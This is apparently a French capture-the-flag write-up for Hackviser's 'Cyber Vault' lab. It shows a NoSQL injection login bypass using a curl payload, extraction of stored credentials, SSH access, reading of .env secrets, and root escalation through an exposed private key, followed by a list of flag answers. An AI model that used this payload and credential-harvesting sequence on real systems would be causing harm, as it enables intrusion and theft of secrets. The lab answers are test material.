# Write-up CTF : Cyber Vault - Hackviser

Ce write-up détaille l'exploitation complète de la plateforme **PassWise**, opérée par **ValkyrieDigital**.

## 1. Énumération et Reconnaissance

### Scan initial

Le scan initial via `nuclei` a révélé plusieurs informations critiques :

- **Serveur Web** : Nginx 1.18.0 servant une application **Node.js (Express)**.
- **Port SSH** : Port 22 ouvert.
- **Vection de vulnérabilité** : `node-express-dev-env` détecté.

### Analyse de la page de connexion

En inspectant le code source de `http://passwise.valkyriedigital.hv/login` et son script associé `/js/login.js`, on observe que l'authentification se fait via une requête POST JSON :

```javascript
var data = { email: email, password: password };
xhr.send(JSON.stringify(data));
```

## 2. Exploitation : Contournement de l'authentification (NoSQL Injection)

L'utilisation d'Express avec un backend type MongoDB sans sanitisation appropriée suggère une vulnérabilité aux injections NoSQL. On tente de contourner le login en utilisant l'opérateur `$gt` (greater than) :

### Payload

```bash
curl -i -X POST http://passwise.valkyriedigital.hv/login \
     -H "Content-Type: application/json" \
     -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
```

### Résultat

Le serveur répond avec un succès (`{"status":"success"}`) et nous fournit un cookie **JWT** (JSON Web Token).

## 3. Post-Exploitation Web : Collecte d'informations

En utilisant le cookie JWT récupéré, on accède au tableau de bord (`/`) :

### Trouver la version du site

Dans la barre de navigation, on identifie directement la version :

- **Version** : `2.4.5`

### Extraction des identifiants stockés

Le tableau de bord PassWise contient plusieurs mots de passe enregistrés. En analysant le DOM, on extrait :

- **Admin Panel** : `admin` / `9BNMFWwQ5SNeAc9`
- **Support Panel** : `support` / `9BNMFWwQ5SNeAc9`
- **SSH Server** : `sherpa` / `7SnkaxtH7CqbcU`

## 4. Accès Système et Analyse de l'application

On utilise les identifiants SSH pour accéder au serveur de ValkyrieDigital.

```bash
ssh sherpa@passwise.valkyriedigital.hv
# Mot de passe : 7SnkaxtH7CqbcU
```

### Analyse des fichiers sensibles

L'application se situe dans `/home/sherpa/passwise`. Le fichier `.env` révèle les secrets de l'infrastructure :

```bash
cat /home/sherpa/passwise/.env
```

- **MONGODB_URI** : `mongodb://root:vhCZFwBaFqKtMbMshL4eYXvp@localhost:27017`
- **Mot de passe de la DB** : `vhCZFwBaFqKtMbMshL4eYXvp`
- **JWT Secret** : `L96d9jbndy977Ws9hBWEDm2S`

## 5. Élévation de Privilèges : Root

En explorant le système, on remarque des fichiers inhabituels dans le répertoire `/home` :

- `/home/root_id_rsa` : Une clé privée SSH appartenant à l'utilisateur root, lisible par l'utilisateur courant.

### Compromission Root

On utilise cette clé pour obtenir un shell root :

```bash
ssh -i /home/root_id_rsa root@localhost
```

### Dernière commande effectuée par Root

Une fois root, on inspecte l'historique des commandes :

```bash
tail -n 1 /root/.bash_history
```

- **Dernière commande** : `apt-get update`

## Résumé des Flags/Réponses

- **Version** : 2.4.5
- **Utilisateur/Password Serveur** : sherpa / 7SnkaxtH7CqbcU
- **Password Database** : vhCZFwBaFqKtMbMshL4eYXvp
- **JWT Secret** : L96d9jbndy977Ws9hBWEDm2S
- **Dernière commande Root** : apt-get update
